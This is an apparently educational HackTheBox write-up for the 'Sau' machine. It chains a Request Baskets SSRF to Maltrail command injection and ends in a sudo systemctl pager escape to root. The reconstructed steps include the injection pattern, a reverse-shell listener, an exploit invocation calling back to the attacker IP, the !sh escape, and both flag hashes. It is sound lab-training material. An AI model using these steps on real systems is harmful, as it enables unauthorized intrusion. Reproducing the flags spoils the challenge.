<div align="center">
  <h1>Sau - HackTheBox Walkthrough</h1>
  <img src="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/1ea2980b9dc2d11cf6a3f82f10ba8702.png" width="120" style="border-radius: 50%; border: 4px solid #9fef00;">

  <br>

  ### 📋 Machine Info
  **Name:** Sau | **IP:** 10.129.229.26 | **OS:** Linux (Ubuntu)  
  **Difficulty:** Easy | **Release:** July 8, 2023 | **Retired:** November 11, 2023
</div>

---

## 🔍 Reconnaissance

### What is Reconnaissance?

Reconnaissance (or "recon") is the first phase of penetration testing where we gather information about our target. Think of it like scouting before a battle - we need to know what we're dealing with!

### Initial Nmap Scan

**What is Nmap?**  
Nmap (Network Mapper) is a powerful network scanning tool that helps us discover:
- What ports are open on the target
- What services are running on those ports
- What versions of those services are installed

**Command Used:**

```bash
nu -d -p- -A 10.129.229.26
```

**Command Breakdown:**
- `nu` - Nmap Unleashed (a wrapper/alias for nmap)
- `-d` - Enable debugging (shows detailed progress)
- `-p-` - Scan ALL 65,535 ports (not just common ones)
  - `-p-` is shorthand for `-p1-65535`
  - By default, Nmap only scans ~1,000 common ports
- `-A` - Aggressive scan (enables OS detection, version detection, script scanning, and traceroute)
- `10.129.229.26` - Target IP address

**Why these flags?**
- `-d` helps us see what Nmap is doing in real-time
- `-p-` ensures we don't miss any services on uncommon ports
- `-A` gives us maximum information about each service

**Results:**

```
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7
55555/tcp open     http    Golang net/http server
| http-title: Request Baskets
|_Requested resource was /web
80/tcp    filtered http
8338/tcp  filtered unknown
```

**Understanding the Results:**

| Port | Service | Version | What it means |
|------|---------|---------|---------------|
| 22/tcp | SSH | OpenSSH 8.2p1 Ubuntu | Secure Shell - encrypted remote access |
| 55555/tcp | HTTP | Golang net/http server | Web server running Request Baskets |
| 80/tcp | HTTP | Filtered | Internal service (blocked by firewall) |
| 8338/tcp | Unknown | Filtered | Internal service (blocked by firewall) |

**Operating System Detection:**
```
OS match: Linux 5.0 - 5.14 (100%)
OS match: Ubuntu Linux
```

**Key Takeaway:** We found Request Baskets on port 55555, and there are internal services (ports 80 and 8338) blocked by a firewall. Our challenge is to bypass the firewall!

---

## 🌐 Web Enumeration

### What is Web Enumeration?

Web enumeration is the process of exploring a web application to understand its structure, functionality, and potential vulnerabilities. We're basically mapping out the website.

### Exploring Port 55555

**Why check port 55555?**  
This is an unusual port for a web service. When we see non-standard ports, it often means there's something interesting running there!

**How to access it:**

```bash
# Option 1: Use a web browser
firefox http://10.129.229.26:55555

# Option 2: Use curl from command line
curl http://10.129.229.26:55555
```

**What I Found:**  
A web application called **Request Baskets** with:
- A clean, simple interface
- Ability to create "baskets" to collect HTTP requests
- Settings/configuration options for each basket
- Version information: Request Baskets (Golang-based)

**What is Request Baskets?**  
Request Baskets is a web service that creates temporary HTTP request collectors. Think of it like a mailbox where you can send HTTP requests and inspect them later. It's commonly used for:
- Testing webhooks
- Debugging HTTP clients
- Inspecting API calls

**Why is this interesting?**  
If Request Baskets can collect and forward requests, maybe we can use it to access those filtered internal services (ports 80 and 8338)!

---

## 🔓 SSRF Vulnerability Discovery

### What is SSRF?

**SSRF = Server-Side Request Forgery**

This is when a web application can be tricked into making requests on behalf of an attacker. Imagine you're inside a secure building (the server), and someone outside asks you to fetch something from a restricted area that only you can access!

**Real-world example:**
- Normal: You → Website → Internet
- SSRF: You → Website → Internal Network (places you shouldn't reach!)

### Identifying the Vulnerability

**CVE-2023-27163** - Request Baskets SSRF Vulnerability

**What's the problem?**  
Request Baskets allows you to configure a "Forward URL" - where requests should be sent. But it doesn't properly validate this URL, so we can make it forward requests to internal services!

**Why is this dangerous?**
- We can bypass firewall restrictions
- Access internal services (like that filtered port 8338!)
- Potentially exploit internal applications

---

## 💣 Exploitation - SSRF Attack

### Step 1: Configure the Basket

**Creating a basket to access internal services:**

1. **Navigate to Request Baskets:** `http://10.129.229.26:55555`

2. **Create a new basket:**
   - Click "Create" or use an existing basket like "Root"
   - Choose a memorable name

3. **Click the settings/gear icon ⚙️**

4. **Configure these exact settings:**

| Setting | Value | Purpose |
|---------|-------|---------|
| Forward URL | `http://127.0.0.1:80` | Where requests should be forwarded |
| ☑ Insecure TLS | Checked | Allow HTTP (not HTTPS) forwarding |
| ☑ Proxy Response | Checked | Return the response back to us |
| ☑ Expand Forward Path | Checked | Forward the complete URL path |
| Basket Capacity | 200 | How many requests to store (default is fine) |

5. **Click "Apply" to save**

**Understanding these settings:**

- **Forward URL: http://127.0.0.1:80**
  - `127.0.0.1` means "localhost" (the server itself)
  - Port `80` is where the internal service is running
  - This tells Request Baskets to send all requests to the internal service

- **Proxy Response**
  - Without this, we'd send requests but never see the responses
  - With it enabled, we can interact with the internal service like we're directly connected

- **Expand Forward Path**
  - If we visit `/basket/login`, it forwards to `http://127.0.0.1:80/login`
  - This ensures the full URL path is preserved

**What just happened?**  
We've created a "tunnel" through the firewall! Requests to our basket now get forwarded to the internal service.

### Testing the SSRF

**Verification:**

```bash
curl http://10.129.229.26:55555/Root
```

**What we expect to see:**  
The response from the internal service (port 80), which turns out to be **Maltrail v0.53** - a malicious traffic detection system!

---

## 🎯 Discovering Maltrail

### What is Maltrail?

Maltrail is a malicious traffic detection system. It monitors network traffic and alerts on suspicious activity. Ironically, we're about to exploit it!

**Version detected:** Maltrail v0.53

**How did we find this?**  
When we accessed our basket, it forwarded the request to the internal service and showed us the Maltrail web interface!

### Researching Vulnerabilities

**CVE-2023-26035** - Maltrail Unauthenticated Remote Code Execution

**What's the vulnerability?**  
Maltrail v0.53 has a command injection vulnerability in the login page. The `username` parameter doesn't properly sanitize input, allowing us to execute arbitrary commands!

**Exploit technique:**
```bash
username=;`command here`
```

The semicolon (`;`) ends the original command, and the backticks (`` ` ``) execute our command!

---

## 🚀 Automated Exploitation

### Using the GitHub Script

Rather than manually exploiting Maltrail, we can use an automated script that combines the SSRF and RCE exploits!

**Finding the exploit:**  
Search GitHub for "ssrf_to_rce_sau" or go directly to:  
[https://github.com/bl4ckarch/ssrf_to_rce_sau](https://github.com/bl4ckarch/ssrf_to_rce_sau)

**What does this script do?**
1. Creates a basket automatically via the API
2. Configures it to forward to `http://127.0.0.1:80` (Maltrail)
3. Generates a reverse shell payload
4. Sends the Maltrail exploit through the basket
5. Gives us a shell!

### Setting Up the Listener

**Why do we need a listener?**  
A reverse shell connects *back* to us, so we need to be listening for that incoming connection!

**Command:**

```bash
nc -lvnp 4444
```

**Command Breakdown:**
- `nc` - Netcat, the "Swiss Army knife" of networking
- `-l` - Listen mode (wait for incoming connections)
- `-v` - Verbose (show connection details)
- `-n` - No DNS lookup (faster)
- `-p 4444` - Port to listen on

**Output:**

```
listening on [any] 4444 ...
```

**Important:** Start the listener BEFORE running the exploit!

### Running the Exploit

**Command:**

```bash
python3 ssrf_to_rce_sau.py 10.10.14.71 4444 http://10.129.229.26:55555
```

**Command Breakdown:**
- `python3` - Run with Python 3
- `ssrf_to_rce_sau.py` - The exploit script
- `10.10.14.71` - Your attacker machine IP (where the shell connects back)
  - This is your HackTheBox VPN IP
  - Find it with: `ip addr show tun0`
- `4444` - Port for the reverse shell (must match listener)
- `http://10.129.229.26:55555` - Target Request Baskets URL

**What the script does automatically:**

```
[+] Creating proxy basket 'ghaegz' pointing to http://127.0.0.1:80
[+] Basket created: http://10.129.229.26:55555/ghaegz
[+] Authorization Token: LeZ1t27MBidVjtEsWpU-xelJ7gYRMcIzpKbUWQm9lPNR
[+] Encoding reverse shell payload...
[+] Sending command injection via proxy to /login...
```

**Listener receives connection:**

```
listening on [any] 4444 ...
connect to [10.10.14.71] from (UNKNOWN) [10.129.229.26] 53046
$ 
```

**Shell obtained! ✅**

---

## 🎯 Post-Exploitation

### Checking Our Privileges

**First command to run:**

```bash
$ whoami
```

**Output:**

```
puma
```

**What does this mean?**  
We're logged in as user `puma`. This is a regular user account, not root (administrator), so we'll need to escalate our privileges later.

**Let's gather more information:**

```bash
$ id
uid=1001(puma) gid=1001(puma) groups=1001(puma)
```

**Understanding the output:**
- `uid=1001` - User ID (not root, which would be 0)
- `gid=1001` - Group ID
- `groups=1001(puma)` - Member of the puma group only

### Finding the User Flag

**What are flags?**  
In HackTheBox, flags are special strings (hashes) that prove you successfully compromised the system. There are typically two:
- **user.txt** - Proof of initial access (what we can get now)
- **root.txt** - Proof of full compromise (need root access)

**Navigating to the user's home directory:**

```bash
$ cd /home/puma
$ ls
```

**Output:**

```
user.txt
```

**Reading the flag:**

```bash
$ cat user.txt
facd3ec499913d059af511e9e2998101
```

**User flag captured! ✅**

---

## ⬆️ Privilege Escalation

### What is Privilege Escalation?

Right now we're user "puma" with limited permissions. Privilege escalation is the process of going from a regular user to root (administrator) to gain full control of the system.

Think of it like:
- Puma = Guest in a house (limited access)
- Root = Homeowner (access to everything)

### Enumeration

**The first thing to check:**

```bash
$ sudo -l
```

**What does this do?**  
Lists what commands the current user can run with `sudo` (superuser privileges).

**Output:**

```
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

**🚨 JACKPOT! 🚨**

**What does this mean?**
- User `puma` can run `/usr/bin/systemctl status trail.service` as root
- `NOPASSWD` means no password required!
- This is our privilege escalation vector!

### Understanding the Vulnerability

**What is systemctl?**  
`systemctl` is a system management tool in Linux. The `status` command shows information about a service.

**Why is this dangerous?**  
When `systemctl status` displays output, it uses a **pager** program (like `less` or `more`) to show the information page by page. When run with `sudo`, this pager runs as **root**!

**The exploit:**  
Pager programs have "escape sequences" that allow you to run shell commands. If the pager is running as root, those commands run as root too!

**GTFOBins:**  
This is a curated list of Unix binaries that can be exploited. Check [GTFOBins - systemctl](https://gtfobins.github.io/gtfobins/systemctl/) for details.

### Exploitation

**Step 1: Run systemctl with sudo**

```bash
$ sudo /usr/bin/systemctl status trail.service
```

**What happens:**  
A pager opens showing the service status. You'll see something like:

```
● trail.service - Maltrail. Server of malicious traffic detection system
     Loaded: loaded (/etc/systemd/system/trail.service; enabled;...
     Active: active (running) since...
...
(press q to quit)
```

**Step 2: Execute the pager escape**

**When the pager is open, type:**

```
!sh
```

**Understanding the command:**
- `!` - In the pager, this means "execute a shell command"
- `sh` - Spawn a shell

**Alternative commands that work:**
- `!/bin/bash`
- `!bash`
- `!/bin/sh`

**What happens:**  
The pager (running as root) spawns a shell, which also runs as root!

**Result:**

```bash
# whoami
root
```

**Root shell obtained! ✅**

### Verifying Root Access

**Double-check our privileges:**

```bash
# id
uid=0(root) gid=0(root) groups=0(root)
```

**Understanding the output:**
- `uid=0(root)` - User ID is 0, which is root!
- We have complete control over the system

### Getting the Root Flag

**Navigate to root's home directory:**

```bash
# cd /root
# ls
```

**Output:**

```
go  root.txt
```

**Reading the root flag:**

```bash
# cat root.txt
b5f97d7af29274617be11cdb5061b021
```

**Root flag captured! ✅✅**

---

## 🔗 Attack Chain Summary

Here's the complete path from nothing to root:

```
1. Nmap Scan
   └─> Discovered port 55555 running Request Baskets
   └─> Found filtered ports 80 and 8338 (internal services)

2. Web Enumeration
   └─> Accessed Request Baskets web interface
   └─> Identified basket configuration options

3. SSRF Discovery
   └─> Research revealed CVE-2023-27163 in Request Baskets
   └─> Baskets can forward requests to internal services

4. Basket Configuration
   └─> Created/configured basket through web interface
   └─> Set Forward URL to http://127.0.0.1:80
   └─> Enabled Proxy Response, Expand Forward Path, Insecure TLS

5. Internal Service Discovery
   └─> Basket forwarded requests to internal Maltrail service
   └─> Identified Maltrail v0.53

6. Maltrail RCE Research
   └─> Found CVE-2023-26035 (command injection in username parameter)
   └─> Downloaded automated exploit script from GitHub

7. Listener Setup
   └─> Started netcat listener: nc -lvnp 4444

8. Exploit Execution
   └─> Ran: python3 ssrf_to_rce_sau.py 10.10.14.71 4444 http://10.129.229.26:55555
   └─> Script exploited SSRF + RCE chain
   └─> Received reverse shell as user 'puma'

9. User Flag
   └─> Navigated to /home/puma
   └─> cat user.txt
   └─> facd3ec499913d059af511e9e2998101

10. Privilege Escalation Enumeration
    └─> Ran: sudo -l
    └─> Found: /usr/bin/systemctl status trail.service (NOPASSWD)

11. Systemctl Pager Escape
    └─> Executed: sudo /usr/bin/systemctl status trail.service
    └─> In pager, typed: !sh
    └─> Obtained root shell

12. Root Flag
    └─> Navigated to /root
    └─> cat root.txt
    └─> b5f97d7af29274617be11cdb5061b021
```

---

## 🐛 Vulnerabilities Identified

| Vulnerability | CVE | Severity | Impact | Fix |
|---------------|-----|----------|--------|-----|
| Request Baskets SSRF | CVE-2023-27163 | **CRITICAL** | Bypass firewall, access internal services | Update to Request Baskets v1.2.2+ |
| Maltrail Command Injection | CVE-2023-26035 | **CRITICAL** | Unauthenticated remote code execution | Update to Maltrail v0.54+ |
| Systemctl Sudo Misconfiguration | N/A | **HIGH** | Local privilege escalation to root | Remove sudo permission or use --no-pager flag |
| Lack of Network Segmentation | N/A | **MEDIUM** | Internal services accessible via SSRF | Implement proper network segmentation |

---

## 🎓 Learning Resources

### SSRF Attacks
- [PortSwigger Web Security Academy - SSRF](https://portswigger.net/web-security/ssrf)
- [OWASP SSRF Guide](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [PayloadsAllTheThings - SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)

### Linux Privilege Escalation
- [GTFOBins](https://gtfobins.github.io/) - Unix binaries that can be exploited
- [HackTricks - Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [PayloadsAllTheThings - Linux Privesc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)

### Penetration Testing
- [HackTheBox Academy](https://academy.hackthebox.com/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)

### Tools & Exploits
- [Request Baskets](https://github.com/darklynx/request-baskets)
- [Maltrail](https://github.com/stamparm/maltrail)
- [SSRF to RCE Script](https://github.com/bl4ckarch/ssrf_to_rce_sau)

---

## 🏆 Conclusion

The Sau machine demonstrates modern web application exploitation through vulnerability chaining:

**Key Skills Demonstrated:**
- ✅ Network reconnaissance with Nmap Unleashed
- ✅ Identifying and exploiting SSRF vulnerabilities
- ✅ Bypassing network firewalls to access internal services
- ✅ Chaining multiple CVEs for remote code execution
- ✅ Using automated exploit scripts effectively
- ✅ Linux privilege escalation via sudo misconfiguration
- ✅ Pager escape techniques (GTFOBins)

**Security Lessons:**
- ⚠️ SSRF vulnerabilities can completely bypass network security
- ⚠️ Internal services need authentication, not just firewall protection
- ⚠️ Input validation is critical in all user-facing parameters
- ⚠️ Sudo permissions should be minimal and carefully audited
- ⚠️ Pager programs running as root are dangerous
- ⚠️ Defense in depth requires multiple security layers
- ⚠️ Keep all software updated to latest versions

**Machine Pwned!** 💀

---

**Flags:**
- **user.txt:** `facd3ec499913d059af511e9e2998101`
- **root.txt:** `b5f97d7af29274617be11cdb5061b021`

---

*This writeup is for educational purposes only. Always obtain proper authorization before testing security on systems you don't own.*
